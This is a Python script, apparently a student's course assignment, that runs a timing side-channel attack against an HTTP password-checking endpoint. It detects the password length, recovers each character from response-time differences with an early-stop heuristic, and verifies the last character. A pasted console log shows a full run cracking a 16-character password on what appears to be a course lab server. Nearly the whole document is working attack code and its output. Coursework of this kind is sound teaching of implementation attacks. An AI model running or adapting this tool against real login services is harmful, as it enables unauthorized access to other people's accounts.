#!/usr/bin/env python3
"""
Timing Side-Channel Attack Implementation - single-file version
Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

WHAT THIS CODE DOES
-------------------
This script performs a timing side-channel attack against a vulnerable
password-checking endpoint. It runs three phases:
  1) Detect password length by measuring response times for padded guesses.
  2) Crack each character position using timing differences. It uses an
     early-stop heuristic to save requests when the environment is stable.
  3) Verify the last character by checking the authentication response.

TERMS & METRICS (short explanation)
----------------------------------
- estimated_step:
    The typical time gain (delta) observed when the server compares one
    additional correct character before failing. For example, if a wrong
    guess returns in ~0.53s but the correct character yields ~0.78s, the
    per-character timing gain is ~0.25s. We compute this as:
        delta = t_best - mean(t_others)
    and track it across positions using an exponential moving average (EMA).

- threshold (used for early-stop decision):
    When testing a new position we:
      * measure times for tested characters so far (times_seen),
      * compute mu = mean(times_seen), sigma = stddev(times_seen),
      * compute noise_threshold = min_sigma_multiplier * sigma,
      * compute history_threshold = delta_safety_factor * estimated_step (if known),
      * choose threshold = max(noise_threshold, history_threshold).
    We accept (early-stop) a candidate if its gap over mu >= threshold.
    This ensures it's above both statistical noise and consistent with the
    learned step from previous positions.

LOGGING & OUTPUT
---------------
- Prints the config at the start.
- Shows per-position: how many letters tested, early-stop decision, threshold used,
  the position time (letter_time) and total elapsed time (both shown in minutes and seconds).
- On completion or KeyboardInterrupt, appends a summary into `attack_run.log`.

USAGE NOTES
-----------
- For local Docker, set base_url to "http://127.0.0.1/" and samples_per_test=1.
- For remote server, set base_url to "http://132.72.81.37/" and increase samples_per_test
  (e.g., 3 or 5) and consider disabling enable_early_stop or making thresholds stricter.

"""

import time
import logging
from dataclasses import dataclass
from typing import Dict, Optional, List
import requests
from datetime import datetime
import json
import os
import signal
import sys


# ============================================================================
# Configuration
# ============================================================================

@dataclass
class AttackConfig:
    """Configuration parameters for the timing attack."""

    # target settings (edit here to switch)
    base_url: str = "http://127.0.0.1/"
    # example remote: "http://132.72.81.37/"

    user_name: str = "316279942"
    difficulty: int = 1

    # attack settings
    max_password_length: int = 32
    charset: str = "abcdefghijklmnopqrstuvwxyz"

    samples_per_test: int = 1         # increase for noisy remote server (3-5)
    enable_early_stop: bool = True    # consider False for noisy remote server

    # tuning for the early-stop heuristic (can be tuned for remote)
    min_samples_for_decision: int = 5
    delta_safety_factor: float = 0.6
    min_sigma_multiplier: float = 3.0

    # external log file
    external_log_path: str = "attack_run.log"

    def get_test_url(self, password: str) -> str:
        return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"


# ============================================================================
# Logging
# ============================================================================

class AttackLogger:
    """Centralized logging for timing attack operations."""

    def __init__(self, log_level: int = logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(log_level)

        # Avoid duplicate handlers on re-run within same interpreter
        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(log_level)
            formatter = logging.Formatter(
                '%(asctime)s | %(levelname)-8s | %(message)s',
                datefmt='%H:%M:%S'
            )
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)

    def info(self, msg: str):
        self.logger.info(msg)

    def debug(self, msg: str):
        self.logger.debug(msg)

    def warning(self, msg: str):
        self.logger.warning(msg)

    def error(self, msg: str):
        self.logger.error(msg)

    @staticmethod
    def print_separator(char: str = "=", length: int = 80):
        print(char * length)

    def print_header(self, text: str):
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str):
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# HTTP Request Handler
# ============================================================================

class RequestHandler:
    """Handles HTTP requests with timing measurements."""
    def __init__(self, logger: AttackLogger):
        self.logger = logger
        self.total_requests = 0
        self.session = requests.Session()
        self.start_time: Optional[float] = None

    def send_request(self, url: str) -> requests.Response:
        self.total_requests += 1
        try:
            response = self.session.get(url, timeout=10)
            return response
        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            raise

    def measure_timing(self, url: str, samples: int) -> float:
        total_time = 0.0
        for _ in range(samples):
            resp = self.send_request(url)
            total_time += resp.elapsed.total_seconds()
        return total_time / samples

    def get_request_count(self) -> int:
        return self.total_requests


# ============================================================================
# Phase 1: Password Length Detection
# ============================================================================

class PasswordLengthDetector:
    """Detects password length using timing analysis."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def detect_length(self) -> int:
        self.logger.print_section("PHASE 1: Password Length Detection")

        timing_data: Dict[int, float] = {}

        for length in range(1, self.config.max_password_length + 1):
            test_password = "a" * length
            test_url = self.config.get_test_url(test_password)
            avg_time = self.request_handler.measure_timing(test_url, self.config.samples_per_test)
            timing_data[length] = avg_time
            self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")

        detected_length = max(timing_data, key=timing_data.get)
        self.logger.info(f"✓ Detected password length: {detected_length} characters")
        self._print_timing_summary(timing_data, detected_length)
        return detected_length

    @staticmethod
    def _print_timing_summary(timing_data: Dict[int, float], detected: int):
        print("\n  Top 5 Candidates by Response Time:")
        sorted_lengths = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        for i, (length, time_val) in enumerate(sorted_lengths[:5], 1):
            marker = "◄ SELECTED" if length == detected else ""
            print(f"    {i}. Length {length:2d}: {time_val:.6f}s {marker}")


# ============================================================================
# Phase 2: Character Cracker with Early-Stop + timing outputs in minutes
# ============================================================================

class CharacterCracker:
    """
    Cracks individual password characters using timing analysis with early-stop.
    """

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

        # moving average of the per-character timing gain
        self.estimated_step: Optional[float] = None

        # bring thresholds from config for convenience
        self.min_samples_for_decision = config.min_samples_for_decision
        self.delta_safety_factor = config.delta_safety_factor
        self.min_sigma_multiplier = config.min_sigma_multiplier

    @staticmethod
    def _format_minutes(seconds: float) -> str:
        """Return string with minutes and seconds: 'Xm YYs' and decimal minutes."""
        mins = seconds / 60.0
        secs = seconds
        return f"{mins:.3f} min ({secs:.2f}s)"

    def crack_position(self, current_password: str, password_length: int, position: int) -> str:
        position_start = time.time()
        self.logger.info(f"Testing position {position}/{password_length}...")

        timing_data: Dict[str, float] = {}
        times_seen: List[float] = []

        best_char: Optional[str] = None
        best_time: float = -1.0

        early_stopped = False
        last_threshold_used = 0.0

        for idx, char in enumerate(self.config.charset, start=1):
            test_password = self._build_test_password(current_password, char, password_length)
            test_url = self.config.get_test_url(test_password)

            total_time = 0.0
            for _ in range(self.config.samples_per_test):
                resp = self.request_handler.send_request(test_url)
                total_time += resp.elapsed.total_seconds()
            avg_time = total_time / self.config.samples_per_test

            timing_data[char] = avg_time
            times_seen.append(avg_time)

            if avg_time > best_time:
                best_time = avg_time
                best_char = char

            if self.config.enable_early_stop and idx >= self.min_samples_for_decision:
                should_stop, threshold = self._should_early_stop(times_seen, best_time)
                last_threshold_used = threshold
                if should_stop:
                    early_stopped = True
                    break

        if best_char is None:
            best_char = max(timing_data, key=timing_data.get)

        position_elapsed = time.time() - position_start
        global_start = getattr(self.request_handler, "start_time", None)
        total_elapsed = time.time() - global_start if global_start is not None else position_elapsed

        # update estimate
        self._update_step_estimate(timing_data, best_char)

        tested_letters = len(timing_data)
        letter_time_str = self._format_minutes(position_elapsed)
        total_time_str = self._format_minutes(total_elapsed)

        if self.config.enable_early_stop:
            self.logger.info(
                f"Position {position}: tested {tested_letters} letters "
                f"(early_stop={'YES' if early_stopped else 'NO'}), "
                f"estimated_step={self._fmt_or_na(self.estimated_step)}s, "
                f"threshold_used={last_threshold_used:.6f}s, "
                f"letter_time={letter_time_str}, total_elapsed={total_time_str}"
            )
        else:
            self.logger.info(
                f"Position {position}: tested all {tested_letters} letters "
                f"(early_stop=DISABLED), estimated_step={self._fmt_or_na(self.estimated_step)}s, "
                f"letter_time={letter_time_str}, total_elapsed={total_time_str}"
            )

        self._print_position_results(timing_data, best_char, position)
        return best_char

    # ----------------- helpers -----------------

    @staticmethod
    def _build_test_password(prefix: str, test_char: str, total_length: int) -> str:
        remaining_length = total_length - len(prefix) - 1
        return prefix + test_char + ("a" * remaining_length)

    def _should_early_stop(self, times_seen: List[float], best_time: float) -> (bool, float):
        n = len(times_seen)
        if n < self.min_samples_for_decision:
            return False, 0.0

        mu = sum(times_seen) / n
        var = sum((t - mu) ** 2 for t in times_seen) / max(n - 1, 1)
        sigma = var ** 0.5
        gap = best_time - mu

        noise_threshold = self.min_sigma_multiplier * sigma
        if self.estimated_step is not None and self.estimated_step > 0:
            history_threshold = self.delta_safety_factor * self.estimated_step
        else:
            history_threshold = 0.0

        threshold = max(noise_threshold, history_threshold)
        return gap >= threshold, threshold

    def _update_step_estimate(self, timing_data: Dict[str, float], best_char: str):
        if best_char not in timing_data or len(timing_data) < 2:
            return

        best_time = timing_data[best_char]
        others = [t for c, t in timing_data.items() if c != best_char]
        mean_others = sum(others) / len(others)
        delta = best_time - mean_others

        if delta <= 0:
            return

        if self.estimated_step is None:
            self.estimated_step = delta
        else:
            alpha = 0.5
            self.estimated_step = alpha * delta + (1 - alpha) * self.estimated_step

        self.logger.debug(f"Updated estimated_step: {self.estimated_step:.6f}s")

    @staticmethod
    def _print_position_results(timing_data: Dict[str, float], best: str, position: int):
        if not timing_data:
            return
        sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        best_time = timing_data[best]
        print(f"\n  Top candidates for position {position}:")
        top_k = min(5, len(sorted_chars))
        for i, (char, time_val) in enumerate(sorted_chars[:top_k], 1):
            diff = time_val - best_time
            marker = "◄ SELECTED" if char == best else ""
            print(f"    {i}. '{char}': {time_val:.6f}s (Δ {diff:+.6f}s) {marker}")

    @staticmethod
    def _fmt_or_na(value: Optional[float]) -> str:
        return f"{value:.6f}" if value is not None else "N/A"


# ============================================================================
# Phase 3: Last Character Verifier
# ============================================================================

class LastCharacterVerifier:
    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def verify_last_char(self, current_password: str) -> Optional[str]:
        self.logger.print_section(f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})")
        for char in self.config.charset:
            test_password = current_password + char
            test_url = self.config.get_test_url(test_password)
            response = self.request_handler.send_request(test_url)
            if response.text.strip() == "1":
                self.logger.info(f"✓ Found correct last character: '{char}'")
                return char
        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Orchestrator + external logging
# ============================================================================

class PasswordCracker:
    def __init__(self, config: AttackConfig, logger: AttackLogger):
        self.config = config
        self.logger = logger
        self.request_handler = RequestHandler(logger)
        self.length_detector = PasswordLengthDetector(config, self.request_handler, logger)
        self.char_cracker = CharacterCracker(config, self.request_handler, logger)
        self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)

    @staticmethod
    def _format_minutes(seconds: float) -> str:
        mins = seconds / 60.0
        return f"{mins:.3f} min ({seconds:.2f}s)"

    def crack_from_scratch(self) -> str:
        # global timer accessible by character cracker
        overall_start = time.time()
        self.request_handler.start_time = overall_start

        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        # print full config at start
        cfg_dict = {
            k: v for k, v in vars(self.config).items() if not k.startswith("__")
        }
        # mask nothing; print config nicely
        print("  Running with configuration:")
        for k, v in cfg_dict.items():
            print(f"    {k}: {v}")
        print()

        self.logger.info("Starting Phase 1: Detect password length")
        password_length = self.length_detector.detect_length()

        self.logger.info("Starting Phase 2: Crack positions")
        cracked_password = self._crack_all_positions(password_length)

        elapsed_time = time.time() - overall_start
        self._print_final_results(cracked_password, elapsed_time)
        return cracked_password

    def crack_with_resume(self, resume_from: str, password_length: int) -> str:
        overall_start = time.time()
        self.request_handler.start_time = overall_start

        self.logger.print_header("RESUMING PASSWORD CRACKING")
        print(f"  Resume from: '{resume_from}' (Position {len(resume_from) + 1}/{password_length})")
        print()

        cracked = self._crack_from_position(resume_from, password_length)
        elapsed_time = time.time() - overall_start
        self._print_final_results(cracked, elapsed_time)
        return cracked

    def _crack_all_positions(self, password_length: int) -> str:
        self.logger.print_section("PHASE 2: Character Position Cracking")
        current_password = ""
        for position in range(1, password_length + 1):
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                break

            next_char = self.char_cracker.crack_position(current_password, password_length, position)
            current_password += next_char
            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()
        return current_password

    def _crack_from_position(self, resume_from: str, password_length: int) -> str:
        current_password = resume_from
        start_position = len(resume_from) + 1
        for position in range(start_position, password_length + 1):
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                break
            next_char = self.char_cracker.crack_position(current_password, password_length, position)
            current_password += next_char
            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()
        return current_password

    def _print_final_results(self, password: str, elapsed_time: float):
        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{password}'")
        print(f"  ⏱ Total Time: {self._format_minutes(elapsed_time)}")
        total_requests = self.request_handler.get_request_count()
        print(f"  📊 Total Requests: {total_requests}")
        if total_requests > 0:
            print(f"  ⚡ Avg Time per Request: {elapsed_time/total_requests:.4f}s")
        self.logger.print_separator("=")

    def verify_password(self, password: str) -> bool:
        test_url = self.config.get_test_url(password)
        response = self.request_handler.send_request(test_url)
        is_correct = response.text.strip() == "1"
        status = "✓ CORRECT" if is_correct else "✗ INCORRECT"
        self.logger.info(f"Password verification: {status}")
        self.logger.debug(f"Response time: {response.elapsed.total_seconds():.6f}s")
        return is_correct


# ============================================================================
# External log writer
# ============================================================================

def append_run_log(path: str, payload: dict):
    """Append JSON line to external log path (create if missing)."""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True) if os.path.dirname(path) else None
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload, ensure_ascii=False) + "\n")
    except Exception as e:
        print(f"Failed to append to log file {path}: {e}")


# ============================================================================
# Main
# ============================================================================

def main():
    # ---- edit here to switch target quickly ----
    config = AttackConfig(
        # base_url="http://127.0.0.1/",   # change to "http://132.72.81.37/" for remote
        base_url="http://aoi-assignment1.oy.ne.ro:8080/",  # change to "http://132.72.81.37/" for remote
        user_name="316279942",          # change user if needed
        # user_name="208145268",          # change user if needed
        difficulty=1,
        samples_per_test=1,             # increase to 3-5 on noisy remote
        enable_early_stop=True          # False or stricter thresholds on remote
    )
    # -------------------------------------------

    logger = AttackLogger(log_level=logging.INFO)
    cracker = PasswordCracker(config, logger)

    # prepare run metadata for external log
    run_id = datetime.utcnow().isoformat() + "Z"
    run_meta = {
        "run_id": run_id,
        "start_time_utc": datetime.utcnow().isoformat() + "Z",
        "config": vars(config),
        "result": None,
        "interrupted": False,
        "elapsed_seconds": None,
        "total_requests": None
    }

    cracked_password = None
    start = time.time()

    # handle Ctrl+C gracefully
    def _sigint_handler(sig, frame):
        raise KeyboardInterrupt()

    signal.signal(signal.SIGINT, _sigint_handler)

    try:
        cracked_password = cracker.crack_from_scratch()
        elapsed = time.time() - start
        run_meta["result"] = {"password": cracked_password}
        run_meta["elapsed_seconds"] = elapsed
        run_meta["total_requests"] = cracker.request_handler.get_request_count()
        append_run_log(config.external_log_path, run_meta)

    except KeyboardInterrupt:
        elapsed = time.time() - start
        run_meta["interrupted"] = True
        run_meta["elapsed_seconds"] = elapsed
        run_meta["total_requests"] = cracker.request_handler.get_request_count()
        run_meta["result"] = {"partial_password": getattr(cracker, "char_cracker", None) and getattr(cracker, "char_cracker", "N/A")}
        append_run_log(config.external_log_path, run_meta)
        logger.warning("Interrupted by user (KeyboardInterrupt). Run summary written to log.")
        print()

    except Exception as e:
        elapsed = time.time() - start
        run_meta["elapsed_seconds"] = elapsed
        run_meta["total_requests"] = cracker.request_handler.get_request_count()
        run_meta["result"] = {"error": str(e)}
        append_run_log(config.external_log_path, run_meta)
        logger.error(f"Unhandled exception: {e}")
        raise

    else:
        logger.info("Run complete. Summary written to external log.")
        print()

    # final verification print (if cracked)
    if cracked_password:
        logger.print_section("FINAL VERIFICATION")
        cracker.verify_password(cracked_password)


if __name__ == "__main__":
    main()



# PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> & C:\Users\dorfe\AppData\Local\Programs\Python\Python313\python.exe "c:/Users/dorfe/OneDrive/Desktop/Projects_2025/Milumentor/Masters/Atacks/Atcks Drill 1/Moving_Average_Refactor.py"
# ================================================================================
#   TIMING SIDE-CHANNEL PASSWORD CRACKER
# ================================================================================
#   Target User: 316279942
#   Difficulty: 1
#   Samples per test: 3
#   Early stop: ENABLED

# --------------------------------------------------------------------------------
#   PHASE 1: Password Length Detection
# --------------------------------------------------------------------------------
# 13:59:45 | INFO     | ✓ Detected password length: 16 characters

#   Top 5 Candidates by Response Time:
#     1. Length 16: 0.543834s ◄ SELECTED
#     2. Length  1: 0.295014s
#     3. Length 15: 0.017769s
#     4. Length 23: 0.017674s
#     5. Length 30: 0.017515s
# --------------------------------------------------------------------------------
#   PHASE 2: Character Position Cracking
# --------------------------------------------------------------------------------
# 13:59:45 | INFO     | Testing position 1/16...
# 14:00:24 | INFO     | Position 1: tested 23 letters (early_stop=YES), estimated_step=0.247308s, threshold_used=0.155005s, letter_time=38.301s, total_elapsed=42.354s

#   Top candidates for position 1:
#     1. 'w': 0.790915s (Δ +0.000000s) ◄ SELECTED
#     2. 'q': 0.552452s (Δ -0.238463s)
#     3. 'p': 0.547806s (Δ -0.243109s)
#     4. 't': 0.547341s (Δ -0.243574s)
#     5. 'r': 0.547286s (Δ -0.243629s)
# 14:00:24 | INFO     | ✓ Password progress: 'w' (1/16)

# 14:00:24 | INFO     | Testing position 2/16...
# 14:01:14 | INFO     | Position 2: tested 21 letters (early_stop=YES), estimated_step=0.246592s, threshold_used=0.161111s, letter_time=50.713s, total_elapsed=93.069s

#   Top candidates for position 2:
#     1. 'u': 1.038412s (Δ +0.000000s) ◄ SELECTED
#     2. 'i': 0.796552s (Δ -0.241859s)
#     3. 'n': 0.795914s (Δ -0.242498s)
#     4. 'o': 0.795187s (Δ -0.243225s)
#     5. 'd': 0.794799s (Δ -0.243613s)
# 14:01:14 | INFO     | ✓ Password progress: 'wu' (2/16)

# 14:01:14 | INFO     | Testing position 3/16...
# 14:01:56 | INFO     | Position 3: tested 13 letters (early_stop=YES), estimated_step=0.248905s, threshold_used=0.209209s, letter_time=41.488s, total_elapsed=134.557s

#   Top candidates for position 3:
#     1. 'm': 1.295045s (Δ +0.000000s) ◄ SELECTED
#     2. 'e': 1.048046s (Δ -0.247000s)
#     3. 'l': 1.047823s (Δ -0.247223s)
#     4. 'c': 1.047268s (Δ -0.247777s)
#     5. 'k': 1.045903s (Δ -0.249143s)
# 14:01:56 | INFO     | ✓ Password progress: 'wum' (3/16)

# 14:01:56 | INFO     | Testing position 4/16...
# 14:02:55 | INFO     | Position 4: tested 15 letters (early_stop=YES), estimated_step=0.247033s, threshold_used=0.190094s, letter_time=59.074s, total_elapsed=193.633s

#   Top candidates for position 4:
#     1. 'o': 1.540829s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.301081s (Δ -0.239748s)
#     3. 'c': 1.300243s (Δ -0.240586s)
#     4. 'f': 1.298306s (Δ -0.242523s)
#     5. 'g': 1.296960s (Δ -0.243869s)
# 14:02:55 | INFO     | ✓ Password progress: 'wumo' (4/16)

# 14:02:55 | INFO     | Testing position 5/16...
# 14:03:47 | INFO     | Position 5: tested 11 letters (early_stop=YES), estimated_step=0.247565s, threshold_used=0.224603s, letter_time=51.672s, total_elapsed=245.307s

#   Top candidates for position 5:
#     1. 'd': 1.790620s (Δ +0.000000s) ◄ SELECTED
#     2. 'a': 1.547478s (Δ -0.243143s)
#     3. 'f': 1.547140s (Δ -0.243481s)
#     4. 'k': 1.543670s (Δ -0.246951s)
#     5. 'h': 1.543391s (Δ -0.247229s)
# 14:03:47 | INFO     | ✓ Password progress: 'wumod' (5/16)

# 14:03:47 | INFO     | Testing position 6/16...
# 14:05:56 | INFO     | Position 6: tested 24 letters (early_stop=YES), estimated_step=0.250664s, threshold_used=0.158772s, letter_time=129.974s, total_elapsed=375.283s

#   Top candidates for position 6:
#     1. 'x': 2.047507s (Δ +0.000000s) ◄ SELECTED
#     2. 'h': 1.843733s (Δ -0.203774s)
#     3. 'm': 1.796073s (Δ -0.251434s)
#     4. 'j': 1.794994s (Δ -0.252513s)
#     5. 'r': 1.794274s (Δ -0.253233s)
# 14:05:56 | INFO     | ✓ Password progress: 'wumodx' (6/16)

# 14:05:56 | INFO     | Testing position 7/16...
# 14:08:24 | INFO     | Position 7: tested 24 letters (early_stop=YES), estimated_step=0.252450s, threshold_used=0.155922s, letter_time=147.925s, total_elapsed=523.211s

#   Top candidates for position 7:
#     1. 'x': 2.297414s (Δ +0.000000s) ◄ SELECTED
#     2. 's': 2.050325s (Δ -0.247088s)
#     3. 'h': 2.046875s (Δ -0.250538s)
#     4. 'p': 2.046517s (Δ -0.250897s)
#     5. 'q': 2.046423s (Δ -0.250990s)
# 14:08:24 | INFO     | ✓ Password progress: 'wumodxx' (7/16)

# 14:08:24 | INFO     | Testing position 8/16...
# 14:09:41 | INFO     | Position 8: tested 11 letters (early_stop=YES), estimated_step=0.247085s, threshold_used=0.218951s, letter_time=76.425s, total_elapsed=599.636s

#   Top candidates for position 8:
#     1. 'i': 2.534908s (Δ +0.000000s) ◄ SELECTED
#     2. 'e': 2.299454s (Δ -0.235454s)
#     3. 'c': 2.297000s (Δ -0.237907s)
#     4. 'a': 2.296748s (Δ -0.238160s)
#     5. 'g': 2.295098s (Δ -0.239810s)
# 14:09:41 | INFO     | ✓ Password progress: 'wumodxxi' (8/16)

# 14:09:41 | INFO     | Testing position 9/16...
# 14:11:05 | INFO     | Position 9: tested 11 letters (early_stop=YES), estimated_step=0.246662s, threshold_used=0.223227s, letter_time=84.562s, total_elapsed=684.200s

#   Top candidates for position 9:
#     1. 'i': 2.785720s (Δ +0.000000s) ◄ SELECTED
#     2. 'f': 2.545946s (Δ -0.239774s)
#     3. 'c': 2.545896s (Δ -0.239824s)
#     4. 'e': 2.544467s (Δ -0.241253s)
#     5. 'j': 2.539974s (Δ -0.245746s)
# 14:11:05 | INFO     | ✓ Password progress: 'wumodxxii' (9/16)

# 14:11:05 | INFO     | Testing position 10/16...
# 14:12:38 | INFO     | Position 10: tested 11 letters (early_stop=YES), estimated_step=0.245652s, threshold_used=0.221415s, letter_time=92.743s, total_elapsed=776.945s

#   Top candidates for position 10:
#     1. 'k': 3.032036s (Δ +0.000000s) ◄ SELECTED
#     2. 'a': 2.793610s (Δ -0.238426s)
#     3. 'e': 2.789413s (Δ -0.242623s)
#     4. 'c': 2.788466s (Δ -0.243570s)
#     5. 'h': 2.787320s (Δ -0.244716s)
# 14:12:38 | INFO     | ✓ Password progress: 'wumodxxiik' (10/16)

# 14:12:38 | INFO     | Testing position 11/16...
# 14:15:59 | INFO     | Position 11: tested 22 letters (early_stop=YES), estimated_step=0.247022s, threshold_used=0.159170s, letter_time=201.247s, total_elapsed=978.193s

#   Top candidates for position 11:
#     1. 'v': 3.285606s (Δ +0.000000s) ◄ SELECTED
#     2. 's': 3.042375s (Δ -0.243231s)
#     3. 'l': 3.041972s (Δ -0.243634s)
#     4. 'e': 3.040847s (Δ -0.244759s)
#     5. 'j': 3.040765s (Δ -0.244841s)
# 14:15:59 | INFO     | ✓ Password progress: 'wumodxxiikv' (11/16)

# 14:15:59 | INFO     | Testing position 12/16...
# 14:18:08 | INFO     | Position 12: tested 13 letters (early_stop=YES), estimated_step=0.245261s, threshold_used=0.203063s, letter_time=129.032s, total_elapsed=1107.226s

#   Top candidates for position 12:
#     1. 'm': 3.532535s (Δ +0.000000s) ◄ SELECTED
#     2. 'k': 3.297986s (Δ -0.234548s)
#     3. 'h': 3.297093s (Δ -0.235441s)
#     4. 'j': 3.291491s (Δ -0.241044s)
#     5. 'f': 3.290612s (Δ -0.241923s)
# 14:18:08 | INFO     | ✓ Password progress: 'wumodxxiikvm' (12/16)

# 14:18:08 | INFO     | Testing position 13/16...
# 14:22:03 | INFO     | Position 13: tested 22 letters (early_stop=YES), estimated_step=0.245588s, threshold_used=0.157508s, letter_time=234.663s, total_elapsed=1341.890s

#   Top candidates for position 13:
#     1. 'v': 3.789483s (Δ +0.000000s) ◄ SELECTED
#     2. 'k': 3.548584s (Δ -0.240899s)
#     3. 'u': 3.547855s (Δ -0.241628s)
#     4. 'j': 3.547060s (Δ -0.242423s)
#     5. 'd': 3.546565s (Δ -0.242918s)
# 14:22:03 | INFO     | ✓ Password progress: 'wumodxxiikvmv' (13/16)

# 14:22:03 | INFO     | Testing position 14/16...
# 14:24:09 | INFO     | Position 14: tested 11 letters (early_stop=YES), estimated_step=0.245876s, threshold_used=0.222932s, letter_time=126.023s, total_elapsed=1467.915s

#   Top candidates for position 14:
#     1. 'b': 4.041882s (Δ +0.000000s) ◄ SELECTED
#     2. 'j': 3.801721s (Δ -0.240161s)
#     3. 'i': 3.799305s (Δ -0.242576s)
#     4. 'h': 3.798601s (Δ -0.243280s)
#     5. 'g': 3.797893s (Δ -0.243989s)
# 14:24:09 | INFO     | ✓ Password progress: 'wumodxxiikvmvb' (14/16)

# 14:24:09 | INFO     | Testing position 15/16...
# 14:29:13 | INFO     | Position 15: tested 25 letters (early_stop=YES), estimated_step=0.248286s, threshold_used=0.151288s, letter_time=303.860s, total_elapsed=1771.777s

#   Top candidates for position 15:
#     1. 'y': 4.291382s (Δ +0.000000s) ◄ SELECTED
#     2. 'w': 4.049083s (Δ -0.242299s)
#     3. 'b': 4.048845s (Δ -0.242537s)
#     4. 'f': 4.048055s (Δ -0.243327s)
#     5. 'd': 4.046185s (Δ -0.245197s)
# 14:29:13 | INFO     | ✓ Password progress: 'wumodxxiikvmvby' (15/16)

# --------------------------------------------------------------------------------
#   PHASE 3: Last Character Verification (Position 16)
# --------------------------------------------------------------------------------
# 14:31:05 | INFO     | ✓ Found correct last character: 'z'
# ================================================================================
#   ATTACK COMPLETE
# ================================================================================
#   ✓ CRACKED PASSWORD: 'wumodxxiikvmvbyz'
#   ⏱ Total Time: 1883.45 seconds (31.39 minutes)
#   📊 Total Requests: 893
#   ⚡ Avg Time per Request: 2.1091s
# ================================================================================

# --------------------------------------------------------------------------------
#   FINAL VERIFICATION
# --------------------------------------------------------------------------------
# 14:31:09 | INFO     | Password verification: ✓ CORRECT
# PS C:\Users\dorfe\OneDrive\Desktop\Projects_2025\Milumentor\Masters\Atacks\Atcks Drill 1> ^C
